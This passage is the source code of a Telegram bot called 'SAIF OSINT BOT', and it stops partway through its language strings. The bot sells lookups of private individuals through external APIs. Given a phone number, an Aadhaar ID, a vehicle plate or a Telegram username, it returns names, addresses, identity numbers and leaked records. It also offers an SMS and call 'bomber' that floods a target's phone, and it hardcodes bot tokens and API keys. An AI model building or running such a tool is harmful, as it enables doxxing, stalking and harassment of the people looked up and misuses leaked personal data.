# -*- coding: utf-8 -*-
import os
import telebot
import requests
import re
import threading
import time
import json
import sys
import io
import sqlite3
import random
import string
import asyncio
from datetime import datetime
from telethon import TelegramClient
from telethon.errors import UsernameNotOccupiedError

# ==================== CONFIG ====================
BOT_TOKEN = "8664037209:AAG7xtjPyNW3xH5ePURfcNwOQwFpLK88g6k"
ADMIN_ID = 7500110150
PARTNER_ID = 6186265634

API_ID = 34979884
API_HASH = '82359dbad7df6d6a9edff5a02c307457'

CHANNEL_ID = -1003932190548
GROUP_ID = -1003862483348
CHANNEL_LINK = "https://t.me/techhackingapi_saifali77"
GROUP_LINK = "https://t.me/numtoinfosaifalihff"

PHONE_KEY = "mysecretkey123"
AADHAR_KEY = "mysecretkey123"
VEHICLE_INFO_KEY = "paid-key-lifetime"
VEHICLE_TO_NUM_KEY = "paid-key-lifetime"
TELEGRAM_KEY = "tg-ad-api"
TG_USERID_TO_NUM_KEY = "gk_45dcbcf7ae271d16488a9cb319e5afda"
NUM_ADVANCE_KEY = "tg-ad-api"

PHONE_URL = 'https://movements-invoice-amanda-victoria.trycloudflare.com/search/number'
AADHAR_URL = 'https://movements-invoice-amanda-victoria.trycloudflare.com/search/aadhar'
VEHICLE_INFO_URL = 'https://simple-rc-info.vercel.app/rc'
VEHICLE_INFO_URL_2 = 'https://rc-api.vercel.app/rc'
VEHICLE_INFO_URL_3 = 'https://vehicle-info-api.herokuapp.com/api/rc'
VEHICLE_TO_NUM_URL = 'https://bronx-web-api.onrender.com/api/key-bronx/veh2num'
TELEGRAM_API_URL = 'https://bronx-web-api.onrender.com/api/key-bronx/tg'
TG_USERID_TO_NUM_URL = 'https://z4xxhydra-api.onrender.com/api/v1/telegr'
IP_INFO_URL = 'https://sudipta-ip-info.vercel.app/api/v1/ip'
GST_INFO_URL = 'https://sudipta-gst.sudipta.workers.dev/'
IFSC_INFO_URL = 'https://ifsc.razorpay.com/'
BOMBER_API_URL = 'https://prime-ultra-api-bronx.onrender.com/api/bomber'
CALL_BOMBER_API_URL = 'https://prime-ultra-api-bronx.onrender.com/api/call'
NUM_ADVANCE_URL = 'https://bronx-web-api.onrender.com/api/key-bronx/numleak'

RESULT_PHOTO_URL = 'https://kommodo.ai/i/GPLuVSnNYtOYk8VWklOM'
WELCOME_PHOTO_URL = 'https://cdn.phototourl.com/free/2026-07-02-ec6fd53b-ac96-446a-8ad7-6a4eb31c41a8.png'
OWNER_PHOTO_URL = 'https://kommodo.ai/i/flHOWFDne1dEc4czUcSq'
OWNER_INSTA = 'https://www.instagram.com/nxt_level_saif?igsh=N2F6andhYjczaXow'
OWNER_WHATSAPP = 'https://wa.me/918354007258'

VERIFIED_FILE = 'verified_users.json'
file_lock = threading.Lock()

def get_random_emoji():
    emojis = ["🔥", "🚀", "💎", "✨", "🌟", "⚡", "🎯", "💪", "🤖", "🛸", "🌈", "⭐", "🎉", "💥", "🔮", "🦅", "🚨", "🎇", "🧿"]
    return random.choice(emojis)

main_loop = None
client = TelegramClient('session_name', API_ID, API_HASH)

def resolve_username_sync(username):
    if username.startswith('@'):
        username = username[1:]
    try:
        future = asyncio.run_coroutine_threadsafe(
            client.get_entity(f"@{username}"), 
            main_loop
        )
        entity = future.result(timeout=10)
        return str(entity.id)
    except UsernameNotOccupiedError:
        return None
    except Exception as e:
        print(f"Resolve Error: {e}")
        return None

def load_verified_users():
    with file_lock:
        if os.path.exists(VERIFIED_FILE):
            try:
                with open(VERIFIED_FILE, 'r') as f:
                    data = json.load(f)
                    return {int(k): v for k, v in data.items()}
            except:
                return {}
        return {}

def save_verified_users():
    with file_lock:
        data_to_save = {str(uid): expiry for uid, expiry in verified_users.items() if uid != ADMIN_ID and uid != PARTNER_ID}
        with open(VERIFIED_FILE, 'w') as f:
            json.dump(data_to_save, f, indent=2)

verified_users = load_verified_users()

conn = sqlite3.connect('bot_database.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, tries INTEGER DEFAULT 0, banned INTEGER DEFAULT 0)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS promo_codes (code TEXT PRIMARY KEY, reward_tries INTEGER, max_users INTEGER, used_count INTEGER DEFAULT 0, used_by TEXT DEFAULT '', generated_by INTEGER)''')
conn.commit()

bot = telebot.TeleBot(BOT_TOKEN)
user_history = {}
user_states = {}
user_lang = {}
temp_data = {}
promo_data = {}
bombing_sessions = {}

def check_membership(user_id):
    try:
        try:
            channel_member = bot.get_chat_member(CHANNEL_ID, user_id)
            if channel_member.status not in ['member', 'administrator', 'creator']:
                return False, "Channel"
        except Exception:
            return False, "Channel"
        try:
            group_member = bot.get_chat_member(GROUP_ID, user_id)
            if group_member.status not in ['member', 'administrator', 'creator']:
                return False, "Group"
        except Exception:
            return False, "Group"
        return True, None
    except Exception as e:
        print(f"Membership check error: {e}")
        return False, "Unknown"

def safe_delete_message(chat_id, message_id):
    try:
        bot.delete_message(chat_id, message_id)
    except Exception:
        pass

def get_user_tries(user_id):
    try:
        c = conn.cursor()
        c.execute("SELECT tries, banned FROM users WHERE user_id = ?", (user_id,))
        result = c.fetchone()
        c.close()
        return (result[0], result[1]) if result else (0, 0)
    except:
        return 0, 0

def add_tries(user_id, amount):
    try:
        c = conn.cursor()
        c.execute("SELECT tries FROM users WHERE user_id = ?", (user_id,))
        result = c.fetchone()
        if result:
            c.execute("UPDATE users SET tries = tries + ? WHERE user_id = ?", (amount, user_id))
        else:
            c.execute("INSERT INTO users (user_id, tries) VALUES (?, ?)", (user_id, amount))
        conn.commit()
        c.close()
        return True
    except:
        return False

def use_try(user_id):
    if user_id == ADMIN_ID or user_id == PARTNER_ID:
        return True
    try:
        c = conn.cursor()
        c.execute("SELECT tries FROM users WHERE user_id = ?", (user_id,))
        result = c.fetchone()
        if result and result[0] > 0:
            c.execute("UPDATE users SET tries = tries - 1 WHERE user_id = ?", (user_id,))
            conn.commit()
            c.close()
            return True
        c.close()
        return False
    except:
        return False

def get_remaining_tries(user_id):
    if user_id == ADMIN_ID or user_id == PARTNER_ID:
        return 999999
    try:
        c = conn.cursor()
        c.execute("SELECT tries FROM users WHERE user_id = ?", (user_id,))
        result = c.fetchone()
        c.close()
        return result[0] if result else 0
    except:
        return 0

def is_user_banned(user_id):
    try:
        c = conn.cursor()
        c.execute("SELECT banned FROM users WHERE user_id = ?", (user_id,))
        result = c.fetchone()
        c.close()
        if result is None:
            return False
        return result[0] == 1
    except:
        return False

def register_user(user_id):
    try:
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO users (user_id, tries, banned) VALUES (?, 0, 0)", (user_id,))
        conn.commit()
        c.close()
        return True
    except:
        return False

def can_search(user_id):
    if user_id == ADMIN_ID or user_id == PARTNER_ID:
        return True
    if is_user_banned(user_id):
        return False
    return get_remaining_tries(user_id) > 0

def generate_promo_code():
    prefixes = ["SAIFALI", "ALISAIF", "SAIF"]
    prefix = random.choice(prefixes)
    if prefix == "SAIF":
        suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    else:
        length = random.randint(4, 6)
        suffix = ''.join(random.choices(string.digits, k=length))
    code = prefix + suffix
    c = conn.cursor()
    c.execute("SELECT code FROM promo_codes WHERE code = ?", (code,))
    if c.fetchone():
        c.close()
        return generate_promo_code()
    c.close()
    return code

def save_promo_code(code, reward_tries, max_users, admin_id):
    try:
        c = conn.cursor()
        c.execute('''INSERT INTO promo_codes (code, reward_tries, max_users, used_count, used_by, generated_by) VALUES (?, ?, ?, 0, '', ?)''', (code, reward_tries, max_users, admin_id))
        conn.commit()
        c.close()
        return True
    except:
        return False

def redeem_promo_code(code, user_id):
    try:
        c = conn.cursor()
        c.execute("SELECT reward_tries, max_users, used_count, used_by FROM promo_codes WHERE code = ?", (code,))
        result = c.fetchone()
        c.close()
        if not result:
            return None
        reward_tries, max_users, used_count, used_by = result
        if used_count >= max_users:
            return None
        used_list = used_by.split(',') if used_by else []
        if str(user_id) in used_list:
            return -1
        add_tries(user_id, reward_tries)
        used_list.append(str(user_id))
        new_used_by = ','.join(used_list)
        c = conn.cursor()
        c.execute('''UPDATE promo_codes SET used_count = used_count + 1, used_by = ? WHERE code = ?''', (new_used_by, code))
        conn.commit()
        c.close()
        return reward_tries
    except:
        return None

def get_lang(user_id):
    return user_lang.get(user_id, 'en')

def get_footer(user_id=None):
    footer = get_random_emoji() + " "
    if user_id and (user_id != ADMIN_ID and user_id != PARTNER_ID):
        remaining = get_remaining_tries(user_id)
        footer += f"\n🔍 <b>Remaining Searches: {remaining}</b>"
    footer += "\n🛡️ <b>POWERED BY @SAIFALI883883</b>\n🤝🏻 <b>PARTNERSHIP @HACKK4FUN</b>"
    return footer

def save_to_history(user_id, query_type, query_value):
    if user_id not in user_history:
        user_history[user_id] = []
    user_history[user_id].append(f"{query_type}: {query_value}")
    if len(user_history[user_id]) > 20:
        user_history[user_id].pop(0)

def strip_emoji(text):
    emoji_pattern = re.compile("["
        u"\U0001F600-\U0001F64F"
        u"\U0001F300-\U0001F5FF"
        u"\U0001F680-\U0001F6FF"
        u"\U0001F1E0-\U0001F1FF"
        u"\U00002702-\U000027B0"
        u"\U000024C2-\U0001F251"
        u"\U0001F926-\U0001F937"
        u"\U0001F900-\U0001F9FF"
        u"\U0001FA70-\U0001FAFF"
        u"\U00002600-\U000026FF"
        u"\U00002700-\U000027BF"
        "]+", flags=re.UNICODE)
    return emoji_pattern.sub(r'', text).strip()

def sanitize_raw_data(data):
    if not isinstance(data, dict):
        return data
    cleaned = data.copy()
    unwanted = ['powered_by', 'api_info', 'credit', 'sources', 'bronx', 'ultra', 'by', 'developer', 'api_credit', 'source', '_proxy', 'response_time', 'timestamp', 'response_time_seconds']
    for key in unwanted:
        cleaned.pop(key, None)
    if 'api_1_car_info' in cleaned and isinstance(cleaned['api_1_car_info'], dict):
        for key in unwanted:
            cleaned['api_1_car_info'].pop(key, None)
    if 'api_2_ummym' in cleaned and isinstance(cleaned['api_2_ummym'], dict):
        cleaned['api_2_ummym'].pop('_proxy', None)
        if 'data' in cleaned['api_2_ummym'] and isinstance(cleaned['api_2_ummym']['data'], dict):
            for key in unwanted:
                cleaned['api_2_ummym']['data'].pop(key, None)
    cleaned.pop('credit', None)
    cleaned.pop('response_time_seconds', None)
    cleaned.pop('timestamp', None)
    cleaned.pop('response_time', None)
    return cleaned

def send_result_with_buttons(chat_id, loading_msg, formatted_text, raw_data, user_id=None):
    safe_delete_message(chat_id, loading_msg.message_id)
    final_text = formatted_text
    if user_id and user_id != ADMIN_ID and user_id != PARTNER_ID:
        remaining = get_remaining_tries(user_id)
        final_text += f"\n\n🔍 <b>Remaining Searches: {remaining}</b>"
    final_text += get_footer(user_id)
    emoji = get_random_emoji()
    bot.send_photo(chat_id, photo=RESULT_PHOTO_URL, caption=f"{emoji} SAIF OSINT RESULT {emoji}", parse_mode='HTML')
    if len(final_text) > 4096:
        for i in range(0, len(final_text), 4000):
            chunk = final_text[i:i+4000]
            bot.send_message(chat_id, chunk, parse_mode='HTML')
    else:
        bot.send_message(chat_id, final_text, parse_mode='HTML')
    keyboard = telebot.types.InlineKeyboardMarkup(row_width=2)
    token = str(time.time()) + "_" + str(chat_id)
    clean_data = sanitize_raw_data(raw_data)
    temp_data[token] = {'formatted': formatted_text, 'raw': clean_data}
    keyboard.add(
        telebot.types.InlineKeyboardButton("📋 COPY", callback_data=f"copy_{token}"),
        telebot.types.InlineKeyboardButton("📄 JSON", callback_data=f"json_{token}")
    )
    bot.send_message(chat_id, f"{get_random_emoji()} Options:", reply_markup=keyboard)

# ==================== FORMATTERS ====================
def format_phone(data):
    if not data or data.get('status') != 'success':
        return "❌ No data found"
    results = data.get('result', [])
    if not results:
        return "❌ No records found"
    out = f"📞 Number: {results[0].get('num', 'N/A')}\n📦 Records: {len(results)}\n\n"
    for i, r in enumerate(results, 1):
        out += f"─── RECORD {i} ───\n"
        out += f"👤 Name: {r.get('name', 'N/A')}\n"
        out += f"👤 Father: {r.get('fname', 'N/A')}\n"
        out += f"📱 Mobile: {r.get('num', 'N/A')}\n"
        out += f"📱 Alt: {r.get('alt', 'N/A')}\n"
        out += f"🆔 Aadhar: {r.get('aadhar', 'N/A')}\n"
        out += f"📍 Address: {r.get('address', 'N/A')[:50]}...\n"
        out += f"🔄 Circle: {r.get('circle', 'N/A')}\n\n"
    return out

def format_aadhar(data):
    if not data or data.get('status') != 'success':
        return "❌ No data found"
    results = data.get('result', [])
    if not results:
        return "❌ No records found"
    out = f"🆔 Aadhar: {results[0].get('aadhar', 'N/A')}\n📦 Records: {len(results)}\n\n"
    for i, r in enumerate(results, 1):
        out += f"─── RECORD {i} ───\n"
        out += f"👤 Name: {r.get('name', 'N/A').strip()}\n"
        out += f"👤 Father: {r.get('fname', 'N/A').strip()}\n"
        out += f"📱 Mobile: {r.get('num', 'N/A')}\n"
        out += f"🔄 Circle: {r.get('circle', 'N/A')}\n"
        if r.get('alt'):
            out += f"📱 Alt: {r.get('alt')}\n"
        out += f"📍 Address: {r.get('address', 'N/A').replace('!', ' ').strip()[:50]}...\n\n"
    return out

def format_vehicle_info(data):
    if not data:
        return "❌ No data found"
    car = data.get('api_1_car_info', {})
    ummym = data.get('api_2_ummym', {}).get('data', {})
    if not car and not ummym:
        return "❌ No data found"
    reg_number = car.get('registration_number', ummym.get('rc_number', 'N/A'))
    owner_name = car.get('owner', {}).get('name', ummym.get('owner_name', 'N/A'))
    if (reg_number == 'N/A' or not reg_number) and (owner_name == 'N/A' or not owner_name):
        return "❌ No data found"
    reg = car.get('registration', {})
    reg_date = reg.get('date', ummym.get('registration_date', 'N/A'))
    rto = reg.get('rto', ummym.get('registered_at', 'N/A'))
    rto_authority = reg.get('authority', 'N/A')
    rto_code = reg.get('rto_code', 'N/A')
    owner = car.get('owner', {})
    father_name = owner.get('father_name', ummym.get('father_name', 'N/A'))
    veh = car.get('vehicle', {})
    model = veh.get('model', ummym.get('modelData', {}).get('v_model_name', 'N/A'))
    manufacturer = veh.get('manufacturer', ummym.get('makeData', {}).get('v_make_name', 'N/A'))
    fuel = veh.get('fuel', ummym.get('fuel_type', 'N/A'))
    cc = veh.get('cc', ummym.get('cubic_capacity', 'N/A'))
    seating = veh.get('seating', ummym.get('seat_capacity', 'N/A'))
    variant = veh.get('variant', ummym.get('maker_model', 'N/A'))
    vehicle_type = veh.get('type', ummym.get('vehicle_category_description', 'N/A'))
    color = ummym.get('color', 'N/A')
    norms = ummym.get('norms_type', 'N/A')
    reg_status = ummym.get('rc_status', 'N/A')
    body_type = ummym.get('body_type', 'N/A')
    mobile = 'N/A'
    if ummym.get('mobile_number'):
        mobile = ummym.get('mobile_number')
    elif car.get('rto_contact', {}).get('phone'):
        mobile = car.get('rto_contact', {}).get('phone')
        mobile = str(mobile).replace('(+91)', '').replace('+91', '').replace(' ', '').strip()
    ident = car.get('identification', {})
    chassis = ident.get('chassis', ummym.get('vehicle_chasi_number', 'N/A'))
    engine = ident.get('engine', ummym.get('vehicle_engine_number', 'N/A'))
    ins = car.get('insurance', {})
    insurance_company = ins.get('company', ummym.get('insurance_company', 'N/A'))
    insurance_upto = ins.get('valid_upto', ummym.get('insurance_upto', 'N/A'))
    insurance_policy = ins.get('policy_no', ummym.get('insurance_policy_number', 'N/A'))
    puc = car.get('puc', {})
    puc_upto = puc.get('valid_upto', ummym.get('pucc_upto', 'N/A'))
    puc_no = puc.get('no', ummym.get('pucc_number', 'N/A'))
    fitness = car.get('fitness', {})
    fitness_upto = fitness.get('fitness_upto', ummym.get('fit_up_to', 'N/A'))
    tax_upto = fitness.get('tax_upto', ummym.get('tax_upto', 'N/A'))
    address = car.get('address', {})
    perm_address = address.get('permanent', ummym.get('permanent_address', 'N/A'))
    city = address.get('city', 'N/A')
    pincode = address.get('pincode', 'N/A')
    present_address = address.get('present', ummym.get('present_address', 'N/A'))
    financier = car.get('financier', {})
    financer_name = financier.get('name', ummym.get('financer', 'N/A'))
    year_of_purchase = ummym.get('yearofPurchase', 'N/A')
    manufacturing_date = ummym.get('manufacturing_date_formatted', 'N/A')
    wheelbase = ummym.get('wheelbase', 'N/A')
    unladen_weight = ummym.get('unladen_weight', 'N/A')
    cylinders = ummym.get('no_cylinders', 'N/A')
    out = f"""
🚗 Vehicle: {reg_number}
📅 Reg Date: {reg_date}
🏢 RTO: {rto}
📍 RTO Authority: {rto_authority}
🔢 RTO Code: {rto_code}
🔄 Status: {reg_status}
👤 Owner: {owner_name}
👤 Father: {father_name}
📱 Mobile: {mobile}
🏭 Make: {manufacturer}
🚘 Model: {model}
🎨 Color: {color}
📐 Variant: {variant}
📋 Type: {vehicle_type}
🏷️ Body Type: {body_type}
⛽ Fuel: {fuel}
📏 CC: {cc}
💺 Seats: {seating}
📏 Norms: {norms}
📏 Wheelbase: {wheelbase} mm
⚖️ Weight: {unladen_weight} kg
🔢 Cylinders: {cylinders}
📅 Manufacturing: {manufacturing_date}
📅 Purchase Year: {year_of_purchase}
🔢 Chassis: {chassis}
🔢 Engine: {engine}
🏦 Insurance: {insurance_company}
📅 Insurance Valid: {insurance_upto}
📄 Policy No: {insurance_policy}
✅ PUC: {puc_upto}
📄 PUC No: {puc_no}
✅ Fitness: {fitness_upto}
💰 Tax: {tax_upto}
💰 Financer: {financer_name}
📍 Permanent Address: {perm_address}
🏙️ City: {city}
📮 Pincode: {pincode}
📍 Present Address: {present_address}
"""
    return out

def format_vehicle_info_backup(data):
    if not data:
        return "❌ No data found"
    rc = data.get('rc_number', 'N/A')
    owner = data.get('owner_name', 'N/A')
    if owner:
        owner = owner.replace('*', '').strip()
    father = data.get('father_name', 'N/A')
    if father is None:
        father = 'N/A'
    model = data.get('model_name', 'N/A')
    maker = data.get('maker_model', 'N/A')
    vehicle_class = data.get('vehicle_class', 'N/A')
    fuel = data.get('fuel_type', 'N/A')
    norms = data.get('fuel_norms', 'N/A')
    reg_date = data.get('registration_date', 'N/A')
    insurance = data.get('insurance_company', 'N/A')
    insurance_upto = data.get('insurance_upto', 'N/A')
    fitness = data.get('fitness_upto', 'N/A')
    tax = data.get('tax_upto', 'N/A')
    puc = data.get('puc_upto', 'N/A')
    rto = data.get('rto', 'N/A')
    address = data.get('address', 'N/A')
    city = data.get('city', 'N/A')
    phone = data.get('phone', 'N/A')
    out = f"""
🚗 Vehicle: {rc}
👤 Owner: {owner}
👤 Father: {father}
🏭 Model: {model}
📐 Variant: {maker}
📋 Class: {vehicle_class}
⛽ Fuel: {fuel}
📏 Norms: {norms}
📅 Reg Date: {reg_date}
🏦 Insurance: {insurance}
📅 Insurance Valid: {insurance_upto}
✅ Fitness: {fitness}
💰 Tax: {tax}
✅ PUC: {puc}
🏢 RTO: {rto}
📍 Address: {address}
🏙️ City: {city}
📱 Contact: {phone}
"""
    return out

def format_ip(data):
    if not data or data.get('error'):
        return "❌ No data found"
    ip_data = data.get('data', {})
    ip = data.get('ip', 'N/A')
    first = next(iter(ip_data.values())) if ip_data else {}
    if not first:
        return "❌ Invalid IP"
    return f"""
🌍 IP: {ip}
🌎 Country: {first.get('country', 'N/A')}
🏙️ City: {first.get('city', 'N/A')}
📍 Region: {first.get('region', 'N/A')}
🏢 ISP: {first.get('isp', 'N/A')}
🕐 Timezone: {first.get('timezone', 'N/A')}
📌 Lat: {first.get('lat', 'N/A')}
📌 Lng: {first.get('lon', 'N/A')}
"""

def format_gst(data):
    if not data or data.get('error'):
        return "❌ No data found"
    addr = data.get('address', {})
    return f"""
🆔 GSTIN: {data.get('gstin', 'N/A')}
📊 Status: {data.get('status', 'N/A')}
🏪 Trade: {data.get('trade_name', 'N/A')}
👤 Legal: {data.get('legal_name', 'N/A')}
📋 Type: {data.get('taxpayer_type', 'N/A')}
📅 Reg: {data.get('registration_date', 'N/A')}
📍 Address: {addr.get('building_name', 'N/A')}, {addr.get('street', 'N/A')}, {addr.get('location', 'N/A')}
📮 Pincode: {addr.get('pincode', 'N/A')}
🏛️ State: {addr.get('state_code', 'N/A')}
"""

def format_ifsc(data):
    if not data or data.get('error'):
        return "❌ No data found"
    return f"""
🏦 IFSC: {data.get('IFSC', 'N/A')}
🏛️ Bank: {data.get('BANK', 'N/A')}
📍 Branch: {data.get('BRANCH', 'N/A')}
📮 Address: {data.get('ADDRESS', 'N/A')}
🏙️ City: {data.get('CITY', 'N/A')}
📍 District: {data.get('DISTRICT', 'N/A')}
🏛️ State: {data.get('STATE', 'N/A')}
✅ UPI: {'✅ Yes' if data.get('UPI') else '❌ No'}
✅ NEFT: {'✅ Yes' if data.get('NEFT') else '❌ No'}
"""

def format_vehicle_to_number(data):
    if not data or not data.get('success'):
        return "❌ No data found"
    return f"""
🚗 Vehicle: {data.get('vehicle', 'N/A')}
📱 Mobile: {data.get('mobile_number', 'N/A')}
🔢 Chassis: {data.get('chassis_number', 'N/A')}
🔢 Engine: {data.get('engine_number', 'N/A')}
"""

def format_tg_userid(data):
    if not data or not data.get('status'):
        return "❌ No data found"
    records = data.get('data', {}).get('source1', {}).get('records', [])
    if not records:
        return "❌ No records found"
    r = records[0]
    return f"""
🆔 Target ID: {data.get('target_id', 'N/A')}
📱 Phone: {r.get('phone', 'N/A')}
🌍 Country: {r.get('country', 'N/A')}
🔢 Code: {r.get('country_code', 'N/A')}
"""

def format_upi(phone, results):
    if not results:
        return f"❌ No UPI IDs found for {phone}"
    out = f"📱 Number: {phone}\n📦 Found: {len(results)} UPIs\n\n"
    for i, r in enumerate(results, 1):
        out += f"─── UPI #{i} ───\n"
        out += f"🔹 VPA: {r.get('upi_id', 'N/A')}\n"
        out += f"👤 Name: {r.get('name', 'N/A')}\n"
        out += f"🏦 App: {r.get('app', 'N/A')}\n"
        out += f"✅ Status: {r.get('status', 'N/A')}\n\n"
    return out

def format_num_advance(data):
    if not data:
        return "❌ No data received from API."
    if data.get('success') == False:
        return "❌ API returned failure."
    phone = data.get('number', 'N/A')
    chain = data.get('chain', {})
    calltracer = data.get('calltracer', {})
    records = chain.get('records', [])
    total_records = len(records)
    if not records and not calltracer:
        return f"❌ No data found for {phone}."
    out = f"📱 Number: {phone}\n📦 Records: {total_records} found\n\n"
    if calltracer:
        out += "─── 📞 CALLTRACER DATA ───\n"
        out += f"📱 Number: {calltracer.get('Number', 'N/A')}\n"
        out += f"📍 State: {calltracer.get('Mobile State', 'N/A')}\n"
        out += f"🌐 IP: {calltracer.get('IP address', 'N/A')}\n"
        out += "\n"
    if records:
        out += f"─── 💾 LEAK DATA ({total_records} records) ───\n"
        for i, record in enumerate(records, 1):
            out += f"\n📌 RECORD {i}\n"
            if record.get('Phone'):
                out += f"📱 Phone: {record.get('Phone')}\n"
            if record.get('FullName'):
                out += f"👤 Name: {record.get('FullName')}\n"
            if record.get('DocumentNumber'):
                out += f"🆔 Aadhar: {record.get('DocumentNumber')}\n"
    out += f"\n📅 GENERATED: {datetime.now().strftime('%d-%b-%Y %I:%M %p')}\n"
    out += "🔥 POWERED BY @SAIFALI883883"
    return out

# ==================== CALLBACKS ====================
@bot.callback_query_handler(func=lambda call: call.data.startswith('copy_') or call.data.startswith('json_'))
def handle_copy_json(call):
    token = call.data.split('_', 1)[1]
    data = temp_data.get(token)
    if not data:
        bot.answer_callback_query(call.id, text="❌ Data expired", show_alert=True)
        return
    if call.data.startswith('copy_'):
        bot.send_message(call.message.chat.id, data['formatted'], parse_mode='HTML')
        bot.answer_callback_query(call.id, text="✅ Copied!", show_alert=False)
    else:
        json_text = json.dumps(data['raw'], indent=2, ensure_ascii=False)
        if len(json_text) > 4096:
            file = io.BytesIO(json_text.encode('utf-8'))
            file.name = 'result.json'
            bot.send_document(call.message.chat.id, file, caption="📄 Raw JSON")
        else:
            bot.send_message(call.message.chat.id, f"```json\n{json_text}\n```", parse_mode='Markdown')
        bot.answer_callback_query(call.id, text="✅ JSON sent!", show_alert=False)
    temp_data.pop(token, None)

@bot.callback_query_handler(func=lambda call: call.data == "stop_bomber")
def stop_bomber_callback(call):
    user_id = call.from_user.id
    if user_id in bombing_sessions:
        bombing_sessions[user_id]['active'] = False
        bot.answer_callback_query(call.id, text="🛑 Stopping bomber...", show_alert=False)
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass

@bot.callback_query_handler(func=lambda call: call.data == "verify_me")
def verify_me_callback(call):
    user_id = call.from_user.id
    is_member, missing = check_membership(user_id)
    if not is_member:
        bot.answer_callback_query(
            call.id,
            text=f"❌ Please join our {missing} first! (Channel & Group)",
            show_alert=True
        )
        return
    verified_users[user_id] = None
    save_verified_users()
    try:
        bot.delete_message(call.message.chat.id, call.message.message_id)
    except:
        pass
    send_language_selection(call.message.chat.id)
    bot.answer_callback_query(call.id, text="✅ Verified! Please select your language.", show_alert=False)

@bot.callback_query_handler(func=lambda call: call.data.startswith('lang_'))
def language_selected(call):
    user_id = call.from_user.id
    lang_code = call.data.split('_')[1]
    user_lang[user_id] = lang_code
    try:
        bot.delete_message(call.message.chat.id, call.message.message_id)
    except:
        pass
    send_welcome_message(call.message.chat.id, user_id, lang_code)
    bot.answer_callback_query(call.id)

# ==================== MENUS & TEXTS ====================
LANGUAGES = {'en': {'flag': '🇬🇧', 'name': 'English'}, 'hi': {'flag': '🇮🇳', 'name': 'हिंदी'}}
TEXTS = {
    'en': {
        'welcome': "👋 <b>Welcome to SAIF OSINT BOT</b>\n\n🔍 <b>Your Ultimate OSINT Tool</b>\n\n📌 <b>Features:</b>\n• Phone Number Search\n• Aadhar Card Search\n• Vehicle Info Search\n• SMS + CALL Bomber\n• UPI ID Finder\n• IP, GST, IFSC Info\n• And More!\n\n💡 Type <b>/help</b> to see all commands\n\n👤 Owner: @SAIFALI883883",
        'help': "📚 <b>SAIF OSINT BOT - COMMANDS</b>\n\n<b>📌 BASIC:</b>\n/start - Start Bot\n/help - Show Commands\n/owner - Bot Owner\n/account - My Account\n\n<b>📞 PHONE SEARCH:</b>\n/num 9876543210 - Phone Search\n/aadhar 962397300673 - Aadhar Search\n\n<b>🚗 VEHICLE SEARCH:</b>\n/vehicle MH02FZ0555 - Vehicle Info\n/veh2num MH02FZ0555 - Vehicle to Number\n\n<b>📱 TELEGRAM:</b>\n/tgid 123456789 or @username - TG UserID to Number\n\n<b>💣 BOMBER:</b>\n/bomber 9876543210 - SMS + CALL Bombing\n\n<b>💳 UPI:</b>\n/upi 9876543210 - UPI ID Finder\n\n<b>🌐 NETWORK:</b>\n/ip 8.8.8.8 - IP Info\n/gst 22AAAAA0000A1Z5 - GST Info\n/ifsc SBIN0012455 - IFSC Info\n\n<b>📜 HISTORY:</b>\n/history - View History\n/clear - Clear History\n\n🛡️ <b>POWERED BY @SAIFALI883883</b>",
        'choose_lang': '🌐 Choose your language:',
        'ask_num': '📱 Send 10-digit mobile number:',
        'ask_num_advance': '🔍 Send 10-digit mobile number for Advance search:',
        'ask_aadhar': '🆔 Send 12-digit Aadhar number:',
        'ask_vehicle': '🚗 Send vehicle number (e.g. MH02FZ0555):',
        'ask_veh2num': '🚗 Send vehicle number for details:',
        'ask_tgid': '📱 Send Telegram User ID (numeric) or @username:',
        'ask_ip': '🌐 Send IP address:',
        'ask_gst': '📊 Send GST number (15 chars):',
        'ask_ifsc': '🏦 Send IFSC code:',
        'ask_bomber': '💣 Send 10-digit number for bombing:',
        'ask_upi': '💳 Send 10-digit number for UPI:',
        'err_num': '❌ Mobile number must be 10 digits.',
        'err_aadhar': '❌ Aadhar must be 12 digits.',
        'err_vehicle': '❌ Invalid vehicle number format!',
        'err_tgid': '❌ Invalid Telegram User ID/Username!',
        'err_ip': '❌ Invalid IP format!',
        'err_gst': '❌ Invalid GST format!',
        'err_ifsc': '❌ Invalid IFSC format!',
        'no_history': '📭 No search history found.',
        'history_cleared': '🗑️ History cleared!',
        'no_tries': '❌ No searches left! 💡 Redeem promo code or contact admin.',
    },
    'hi': {
        'welcome': "👋 <b>सैफ OSINT बॉट में आपका स्वागत है</b>\n\n🔍 <b>आपका Ultimate OSINT टूल</b>\n\n📌 <b>फीचर्स:</b>\n• मोबाइल नंबर सर्च\n• आधार कार्ड सर्च\n• वाहन इंफो सर्च\n• SMS + CALL बॉम्बर\n• UPI ID फाइंडर\n• IP, GST, IFSC इंफो\n• और भी बहुत कुछ!\n\n💡 सभी कमांड्स के लिए <b>/help</b> टाइप करें\n\n👤 मालिक: @SAIFALI883883",
        'help': "📚 <b>सैफ OSINT बॉट - कमांड्स</b>\n\n<b>📌 बेसिक:</b>\n/start - बॉट शुरू करें\n/help - कमांड्स देखें\n/owner - मालिक की जानकारी\n/account - मेरा अकाउंट\n\n<b>📞 फोन सर्च:</b>\n/num 9876543210 - फोन सर्च\n/aadhar 962397300673 - आधार सर्च\n\n<b>🚗 वाहन सर्च:</b>\n/vehicle MH02FZ0555 - वाहन इंफो\n/veh2num MH02FZ0555 - वाहन से नंबर\n\n<b>📱 टेलीग्राम:</b>\n/tgid 123456789 या @username - TG ID से नंबर\n\n<b>💣 बॉम्बर:</b>\n/bomber 9876543210 - SMS + CALL बॉम्बिंग\n\n<b>💳 UPI:</b>\n/upi 9876543210 - UPI ID फाइंडर\n\n<b>🌐 नेटवर्क:</b>\n/ip 8.8.8.8 - IP इंफो\n/gst 22AAAAA0000A1Z5 - GST इंफो\n/ifsc SBIN0012455 - IFSC इंफो\n\n<b>📜 इतिहास:</b>\n/history - इतिहास देखें\n/clear - इतिहास हटाएं\n\n🛡️ <b>POWERED BY @SAIFALI883883</b>",
        'choose_lang': '🌐 अपनी भाषा चुनें:',
        'ask_num': '📱 10 अंकीय मोबाइल नंबर भेजें:',
        'ask_num_advance': '🔍 10 अंकीय मोबाइल नंबर भेजें Advance सर्च के लिए:',
